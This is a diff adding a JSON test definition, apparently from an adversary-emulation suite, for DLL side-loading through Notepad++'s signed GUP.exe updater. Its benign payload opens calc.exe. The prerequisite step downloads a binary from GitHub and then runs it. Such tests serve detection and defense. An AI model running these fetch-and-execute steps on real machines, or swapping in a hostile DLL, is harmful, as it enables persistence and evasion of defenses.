@@ -1,0 +1,44 @@
+{
+    "name": "DLL Side-Loading using the Notepad++ GUP.exe binary",
+    "description": "GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded. Upon execution, calc.exe will be opened. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "\"#{gup_executable}\"\n",
+        "cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n",
+        "name": "command_prompt",
+        "type": "Command Executor"
+    },
+    "id": "T1574.002",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation",
+        "Defense Evasion"
+    ],
+    "technique": "DLL Side-Loading",
+    "source": "ART",
+    "uuid": "65526037-7079-44a9-bda1-2cb624838040",
+    "arguments": {
+        "process_name": {
+            "description": "Name of the created process",
+            "type": "string",
+            "default": "calculator.exe"
+        },
+        "gup_executable": {
+            "description": "GUP is an open source signed binary used by Notepad++ for software updates",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})\n",
+            "prereq_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true\" -OutFile \"#{gup_executable}\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
